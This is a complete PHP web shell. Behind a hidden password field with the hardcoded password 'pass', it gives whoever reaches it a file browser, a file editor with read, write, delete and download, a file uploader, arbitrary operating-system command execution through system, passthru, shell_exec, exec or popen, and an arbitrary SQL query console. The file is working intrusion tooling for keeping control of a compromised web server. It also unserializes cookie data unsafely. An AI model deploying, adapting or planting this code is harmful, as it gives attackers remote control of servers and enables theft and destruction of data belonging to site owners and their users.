<?php 

define("PASSWORD", "pass"); // password ( plain-tetx )
define("STYLE", "dark"); // style ( dark / light )


function RootDir() 
{ 
	return getcwd() . DIRECTORY_SEPARATOR;
}
	
function OS() 
{ 
	return strtoupper(substr(PHP_OS, 0, 3));
}
	
function ThisFile() 
{ 
	return (isset($_GET['file']) && file_exists($_GET['file'])) ? $_GET['file'] : null;
}
	
function ThisUrl() 
{ 
	return "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["PHP_SELF"];
}
	
function ThisPath() 
{
	if(!isset($_COOKIE["shell_path"]) || !is_dir($_COOKIE['shell_path'])) { 
		setcookie("shell_path", RootDir(), time() + (60 * 60 * 24), "/"); 
		return RootDir();
	}
	if(isset($_GET['path']) && is_dir($_GET['path'])) { 
		setcookie("shell_path", $_GET['path'], time() + (60 * 60 * 24), "/"); 
		return $_GET['path']; 
	}
	return $_COOKIE["shell_path"]; 
}

class Shell 
{
	public function __construct() 
	{
		$this->action = @$_GET["act"];
		if(isset($_POST["download"]) && $this->Authenticated()) FileDownloader($_POST['path']);
	}
	
	public function Login() 
	{
		if($this->Authenticated()) return; 
		?>
		<html>
		<form method="POST">
			<input name="password" type="text" style="border:0px">
		</form>
		</html>
		<?php 
		if(@$_POST["password"] == PASSWORD) {
			setcookie("shell_pass", PASSWORD, time() + (60 * 60 * 24), "/");
			header("Location: " . ThisUrl());
		} else {
			exit();
		}
	}
	
	public function Logout() 
	{
		setcookie("shell_pass", null, time() - (60 * 60), "/");
		setcookie("shell_path", null, time() - (60 * 60), "/");
		setcookie("shell_sql", null, time() - (60 * 60), "/");
		header("Location: " . ThisUrl()); 
	}
	
	public function Info() 
	{
		?>
		<table>
			<tr>
				<th>OS: <?php echo @php_uname(); ?></th>
				<th>Server: <?php echo getenv('SERVER_SOFTWARE'); ?></th>
				<th></th>
				<th></th>
			</tr>
			<tr>
				<th>Computer: <?php echo getenv('COMPUTERNAME'); ?></th>
				<th>Domain: <?php echo @php_uname('n'); ?></th>
				<th>User: <?php echo @get_current_user(); ?></th>
				<th>IP: <?php echo (getenv('LOCAL_ADDR') != null) ? getenv('LOCAL_ADDR') : getenv('SERVER_ADDR'); ?></th>
			</tr>
		</table>
		<?php 
	}

	public function Body()
	{
		if($this->action == "fbrowser") { 
			$fbrowser = new FileBrowser(ThisPath()); 
			$fbrowser->Body();
		} elseif($this->action == "feditor") { 
			$feditor = new FileEditor((ThisFile() == null ? ThisPath() : ThisFile())); 
			$feditor->Action();
			$feditor->Body(); 
		} elseif($this->action == "fuploader") { 
			FileUploader(ThisPath()); 
		} elseif($this->action == "cmd") { 
			CommandBody(); 
		} elseif($this->action == "sql") { 
			$sql = new Database(); 
			$sql->Query(); 
			$sql->Body(); 
		} elseif($this->action == "exit") {
			$this->Logout(); 
		}
	}
	
	private function Authenticated() 
	{
		if(!isset($_COOKIE["shell_pass"])) return false; 
		if($_COOKIE["shell_pass"] != PASSWORD) return false; 
		return true; 
	}
}

class FileBrowser 
{
	public function __construct($path) 
	{
		$this->path = $path;
	}
	
	public function Body()
	{
		?>
		<table class="fbrowser">
			<tr style="<?php echo Colors("tr"); ?>">
				<th>CWD: <?php echo $this->CWD(); ?></th>
				<th class="menu" ><a href='?act=fbrowser&path=<?php echo RootDir(); ?>'>Home</a></th>
				<th>Drives: <?php echo $this->Drives(); ?></th>
				<th></th>
				<th></th>
			</tr>
			<tr style="<?php echo Colors("tr"); ?>">
				<th>Name</th><th>Size</th><th>Permissions</th><th>Created</th><th>Modified</th>
			</tr>
			<tr style="<?php echo Colors("tr"); ?>">
				<td><a href='?act=fbrowser&path=<?php echo dirname($this->path) . DIRECTORY_SEPARATOR; ?>'>..</a></td>
				<td></td><td></td><td></td><td></td>
			</tr> 
			<?php echo $this->DirsFiles(); ?>
		</table>
		<?php 
	}
	
	private function DirsFiles() 
	{
		$dfl = $this->listDirsFiles();
		$df_list = ""; 
		
		if($dfl == false) 
			return "<tr><th>Can't access: $this->path</th></tr>"; 
		foreach($dfl[0] as $d) { 
			$df_list .= "<tr><td><a href='?act=fbrowser&path=" . urlencode($d[1] . DIRECTORY_SEPARATOR) . "'>" . $d[0] . DIRECTORY_SEPARATOR . "</a></td>";
			$df_list .= "<td>" . $d[2] . "</td><td>" . $d[3] . " : " . $d[4] . "</td><td>" . $d[5] . "</td><td>" . $d[6] . "</td></tr>";
		} 
		foreach($dfl[1] as $f) { 
			$df_list .= "<tr><td><a href='?act=feditor&file=" . urlencode($f[1]) . "'>" . $f[0] . "</a></td>";
			$df_list .= "<td>" . $f[2] . "</td><td>" . $f[3] . " : " . $f[4] . "</td><td>" . $f[5] . "</td><td>" . $f[6] . "</td></tr>";
		} 
		return $df_list;
	}
	
	public function listDirsFiles() 
	{
		$dirs = array();
		$files = array();
		
		if(($d_f = @scandir($this->path)) === false) return false;
		foreach($d_f as $i) { 
			if($i == '.' || $i == '..') continue;
			$path = $this->path . $i; 
			if(is_dir($this->path . $i)) { 
				$dirs[] = array($i, $path, "Dir", $this->getUidGid($path), $this->getPerms($path), $this->getCMDate($path), $this->getCMDate($path, 9)); 
			}
			if(is_file($this->path . $i)) { 
				$files[] = array($i, $path, $this->getSize($path), $this->getUidGid($path), $this->getPerms($path), $this->getCMDate($path), $this->getCMDate($path, 9)); 
			}
		} 
		return array($dirs, $files);
	}
	
	private function CWD() 
	{
		$path = '';
		$parts = explode(DIRECTORY_SEPARATOR, $this->path);
		foreach($parts as $p) {
			if($p == "") continue;
			$path .= $p . DIRECTORY_SEPARATOR;
			echo '<a href="?act=fbrowser&path=' . $path . '">' . $p . DIRECTORY_SEPARATOR . '</a>';
		}
	}

	private function Drives() 
	{
		foreach(range("A", "Z") as $drive) {
			if(@is_readable($drive . ":" . DIRECTORY_SEPARATOR)) {
				echo "<a href='?act=fbrowser&path=$drive:\\'>$drive:\\&nbsp;</a>"; 
			} elseif(@is_dir($drive . ":" . DIRECTORY_SEPARATOR)) {
				echo "$drive:\\&nbsp;";
			}
		}
	}
	
	private function getSize($path) 
	{
		$stat = stat($path); 
		if($stat[7] > (1024 * 1024)) return (int)($stat[7] / (1024 * 1024)) . " MB";
		elseif($stat[7] > 1024) return (int)($stat[7] / 1024) . " KB";
		else return $stat[7] . " B"; 
	}

	private function getPerms($path) 
	{
		return substr(sprintf("%o", fileperms($path)), -4);
	}

	private function getUidGid($path) 
	{
		$stat = stat($path); 
		return $stat[4] . "/" . $stat[5]; 
	}

	private function getCMDate($path, $d=10) 
	{
		$stat = stat($path);
		return date("d/m/Y H:i", $stat[$d]); 
	}
}

class FileEditor  
{
	public function __construct($path) 
	{
		$this->path = isset($_POST['path'])? $_POST['path'] : $path;
		$this->text = "";
		$this->message = "";
	}
	
	public function Action() 
	{ 
		if(isset($_POST["read"])) $this->feRead();
		elseif(isset($_POST["write"])) $this->feWrite($_POST['content']);
		elseif(isset($_POST["remove"])) $this->message = $this->feRemove($this->path) ? "Deleted." : "Failed.";
		elseif(isset($_POST["rename"])) $this->feRename((ThisFile() == null ? ThisPath() : ThisFile())); 
		elseif(isset($_POST["mkdir"])) $this->feMkdir(); 
	}
	
	public function Body() 
	{ 
		?>
		<form method="POST">
			<input name="path" type="text" size="60" value="<?php echo $this->path; ?>">
			<input name="read" type="submit" value="read >>">
			<input name="write" type="submit" value="write >>">
			<input name="remove" type="submit" value="rmove >>">
			<input name="rename" type="submit" value="rname >>">
			<input name="mkdir" type="submit" value="mkdir >>">
			<input name="download" type="submit" value="dnload >>">
			&nbsp;&nbsp;<b><?php echo $this->message; ?></b>
			<pre class="sep"><textarea name="content"><?php echo $this->text; ?></textarea></pre>
		</form>
		<?php
	}

	public function feRead() 
	{
		if(($data = @file_get_contents($this->path)) !== false ) $this->text = $this->isHtml($data) ? htmlspecialchars($data) : $data; 
		else $this->message = "Can't access file.";
	}

	public function feWrite($data) 
	{
		if(@file_put_contents($this->path, $data) !== false) $this->message = "Saved."; 
		else $this->message = "Failed.";
	}

	private function feRemove($path) 
	{
		if(!is_file($path) && !is_dir($path)) return false; 
		if(is_file($path)) return @unlink($path);
		if(($dir_content = @scandir($path)) === false) return false; 
		foreach($dir_content as $d_f) if($d_f != "." && $d_f != "..") $this->feRemove($path . DIRECTORY_SEPARATOR . $d_f);
		return @rmdir($path);
	}

	private function feRename($new_path) 
	{
		if(@rename($this->path, $new_path) !== false) $this->message = "Renamed."; 
		else $this->message = "Failed.";
	}

	private function feMkdir() 
	{
		if(@mkdir($this->path) !== false) $this->message = "Created."; 
		else $this->message = "Failed."; 
	}
	
	private function isHtml($data) 
	{
		if(preg_match('/<form(.*?)form>/im', $data, $m)) return true;
		if(preg_match('/<table(.*?)table>/im', $data, $m)) return true;
		if(preg_match('/<textarea(.*?)textarea>/im', $data, $m)) return true;
		return false;
	}
}

function FileDownloader($file) 
{
	header("Content-Disposition: attachment; filename=\"" . @basename($file) . "\"");
	header("Content-Length: \"" . @filesize($file) . "\"");
	header("Content-Type: application/octet-stream;");
	@readfile($file);
	exit();
}

function FileUploader($path) 
{
	?>
	<form method="POST", enctype="multipart/form-data">
		<input name="path" type="text" size="60" value="<?php echo $path; ?>">
		<input name="file" type="file">
		<input name="upload" type="submit" value=" >>">
	</form>
	<?php 
	if(isset($_POST["upload"])) { 
		$file_path = $_POST["path"] . basename($_FILES["file"]["name"]);
		if(move_uploaded_file($_FILES["file"]["tmp_name"], $file_path)) echo "<b>File uploaded.</b>";
		else echo "<b>Failed.<b>";
	}
}

class Database 
{
	private $my_dbs = "SHOW DATABASES;"; 
	private $ms_dbs = "SELECT name FROM master.dbo.sysdatabases"; 
	private $my_tbl = "SHOW TABLES;"; 
	private $ms_tbl = "SELECT * FROM INFORMATION_SCHEMA.TABLES;"; 
	
	public function __construct() 
	{
		$this->setCookies(); 
		$cookies = isset($_COOKIE["shell_sql"]) ? unserialize($_COOKIE["shell_sql"]) : array("host", "user", "pass", "db", "dbms");
		$get_db = isset($_GET['db']) ? urldecode($_GET['db']) : null; 
		$get_table = isset($_GET['table']) ? urldecode($_GET['table']) : null; 
		$this->host = isset($_POST['host']) ? $_POST['host'] : $cookies[0];
		$this->user = isset($_POST['user']) ? $_POST['user'] : $cookies[1];
		$this->pass = isset($_POST['pass']) ? $_POST['pass'] :  $cookies[2];
		$this->db = (isset($get_db) ? $get_db : (isset($_POST['db']) ? $_POST['db'] : $cookies[3]));
		$this->dbms = isset($_POST['dbms']) ? $_POST['dbms'] : $cookies[4];
		$this->query = (isset($get_db) ? "SHOW TABLES;" : (isset($get_table) ? "SELECT * FROM $get_table;" : $this->my_dbs));
		if(isset($_POST["submit"])) $this->query = ((@$_POST['query'] != "") ? $_POST['query'] : ($this->dbms == "mssql" ? $this->ms_dbs : $this->my_dbs));
		$this->output = ""; 
	}
	
	public function Body() 
	{ 
		?>
		<form method="POST">
			<input name="host" type="text" size="12" value="<?php echo $this->host; ?>">
			<input name="user" type="text" size="12" value="<?php echo $this->user; ?>">
			<input name="pass" type="text" size="12" value="<?php echo $this->pass; ?>">
			<input name="db" type="text" size="12" value="<?php echo $this->db; ?>">
			<input name="dbms" type="text" size="12" value="<?php echo $this->dbms; ?>">
			<input name="query" type="text" size="60" value="<?php echo $this->query; ?>">
			<input name="submit" type="submit" value=" >>">
		</form>
		<div class="sep">
			<?php echo $this->output; ?> 
		</div>
		<?php 
	}
	
	public function Query() 
	{ 
		if(isset($_POST['submit']) || isset($_GET['db']) || isset($_GET['table'])) { 
			$dsn = "$this->dbms:host=$this->host; dbname=$this->db"; 
			try {
				@$conn = new PDO("$this->dbms:host=$this->host; dbname=$this->db", $this->user, $this->pass);
				@$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
				@$query = $conn->prepare($this->query);
				try { 
					@$query->execute();
					if(strtoupper(substr($this->query, 0, 6)) == "SELECT" || strtoupper(substr($this->query, 0, 4)) == "SHOW") { 
						$this->sqlRead($query); 
					} else { 
						$this->output = "<b>Query executed.</b>";
					}
				} catch(PDOException $e) { 
					$this->output = "<b>Query failed.</b>" . $e->getMessage();
				} 
			} catch(PDOException $e) { 
				$this->output = "<b>Connection failed: </b>" . $e->getMessage();
			}
			$conn = null; 
		}
	}

	private function sqlRead($query) 
	{
		$this->output = "<table class='sql'>";
		$result = @$query->setFetchMode(PDO::FETCH_ASSOC); 
		foreach($query->fetchAll() as $id => $row) {
			if($id == 0) {
				$this->output .= "<tr>";
				foreach($row as $n => $v) $this->output .= "<th>$n</th>";
				$this->output .= "</tr>";
			}
			$this->output .= "<tr>";
			foreach($row as $n => $v) { 
				if(strtoupper($n) == "DATABASE") { 
					$this->output .= "<td><a href='?act=sql&db=" . urlencode($v) . "'>" . $v . "</a></td>";
				} elseif(strtoupper(substr($n, 0, 5)) == "TABLE") { 
					$this->output .= "<td><a href='?act=sql&table=" . urlencode($v) . "'>" . $v . "</a></td>";
				} else { 
					$this->output .= "<td>" . htmlspecialchars($v) . "</td>"; 
				}
			}
			$this->output .= "</tr>";
		} 
		$this->output .= "</table>";
	}
	
	private function setCookies() 
	{ 
		if(!isset($_COOKIE["shell_sql"])) {
			$cookie = array("host", "user", "pass", "db", "dbms");  
		} else { 
			$values = unserialize($_COOKIE["shell_sql"]); 
			$cookie = array();
			$cookie[] = (isset($_POST['host']) && @$_POST['host'] != "") ? $_POST['host'] : $values[0];
			$cookie[] = (isset($_POST['user']) && @$_POST['user'] != "") ? $_POST['user'] : $values[1];
			$cookie[] = (isset($_POST['pass']) && @$_POST['pass'] != "") ? $_POST['pass'] : $values[2];
			$cookie[] = ((isset($_POST['db']) && @$_POST['db'] != "") ? $_POST['db'] : (isset($_GET['db']) ? $_GET['db'] : $values[3]));
			$cookie[] = (isset($_POST['dbms']) && @$_POST['dbms'] != "") ? $_POST['dbms'] : $values[4]; 
		}
		setcookie("shell_sql", serialize($cookie), time() + (60 * 60 * 24), "/"); 
	}
}

function CommandBody()
{ 
	?>
	<form method="POST">
		<input name="cmd" type="text" size="80" value="cmd">
		<input name="run" type="submit" value=" >>">
	</form>
	<?php 
	if(isset($_POST["run"])) {  
		$cmd = @$_POST["cmd"] . " 2>&1";
		echo "<pre>";
		RunCmd($cmd); 
		echo "</pre>"; 
	}
}

function RunCmd($cmd) 
{ 
	if(is_callable("system")) { 
		system($cmd);
	} elseif(is_callable("passthru")) { 
		passthru($cmd);
	} elseif(is_callable("shell_exec")) { 
		echo shell_exec($cmd);
	} elseif(is_callable("exec")) {
		exec($cmd, $out);
		foreach($out as $o) echo $o, PHP_EOL;
	} elseif(is_callable("popen")) {
		if(($pop = popen($cmd, 'r')) === false) return;
		while(!feof($pop)) echo fread($pop, 2096);
		pclose($pop);
	} else { 
		echo "Failed."; 
	}
}

function Colors($part="color") 
{ 
	if(STYLE == "dark") $colors = array("color"=>"#ddefff", "back"=>"#181818", "link"=>"#ddefff", "visited"=>"#83c5ff", "hover"=>"#202020" );
	else $colors = array("color"=>"#181818", "back"=>"#f0f8ff", "link"=>"#015fb2", "visited"=>"#00437e", "hover"=>"#ddefff" );
	
	if($part == "body" || $part == "table" || $part == "tr" || $part == "th" || $part == "td") { 
		return " color:" . $colors['color'] . "; background-color:" . $colors['back'] . "; "; 
	} elseif($part == "input") { 
		if(STYLE == "dark") return " color:" . $colors['back'] . "; background-color:" . $colors['color'] . "; border:1px solid " . $colors['visited'] . "; "; 
		else return " color:" . $colors['hover'] . "; background-color:#242424 ; border:1px solid " . $colors['link'] . "; ";
	} elseif($part == "hover") { 
		return " color:" . $colors['color'] . "; background-color:" . $colors['hover'] . "; "; 
	} else {
		return $colors;
	}
}

?>
<?php $shell = new Shell(); ?>
<?php $shell->Login(); ?>
<?php $colors = Colors("color"); ?>
<html>
<head>
	<title>Shell</title>
	<style>
		body { <?php echo Colors("body"); ?> text-align:left; padding:2px; font-size:12px; }
		table { <?php echo Colors("table"); ?> border-collapse:collapse; width:100%; padding:2px; font-size:12px; }
		th { font-size:13px; text-align:left; padding:2px; }
		td { font-size:12px; text-align:left; padding:2px; }
		table.fbrowser tr { <?php echo Colors("tr"); ?> }
		table.fbrowser tr:hover { <?php echo Colors("hover"); ?> } 
		.sql { border:1px solid <?php echo $colors['color']; ?>; <?php echo Colors("table"); ?> width:100%; padding:2px; font-size:12px;}
		.sql th { <?php echo Colors("th"); ?>  border:1px solid <?php echo $colors['color']; ?>;}
		.sql td { font-size:12px; text-align:left; padding:2px; } 
		.sql tr { <?php echo Colors("tr"); ?> }
		.sql tr:hover { <?php echo Colors("hover"); ?> }
		input { <?php echo Colors("input"); ?> font-size:12px; padding:2px; }
		textarea { width:100%; height:100%; }
		div { padding:2px; }
		.sep { padding:0px; }
		a:link { color:<?php echo $colors['link']; ?>; }
		a:visited { color:<?php echo $colors['visited']; ?>; }
		.menu { text-align:left; padding:2px; font-size:13px; }
		.menu a { color:<?php echo $colors['color']; ?>; text-decoration:none; }
	</style>
</head>
<body>
<div>
	<?php $shell->Info(); ?>
</div>
<div>
	<hr>
	<table class="menu"> 
		<tr>
			<th><a href="?act=fbrowser">FileBrowser</a></th>
			<th><a href="?act=feditor">FileEditor</a></th>
			<th><a href="?act=fuploader">FileUploader</a></th>
			<th><a href="?act=cmd">RunCmd</a></th>
			<th><a href="?act=sql">SqlQueries</a></th>
			<th><a href="?act=exit">Exit</a></th>
		</tr>
	</table>
	<hr>
</div>
<div>
	<?php $shell->Body(); ?>
</div>
</body>
</html>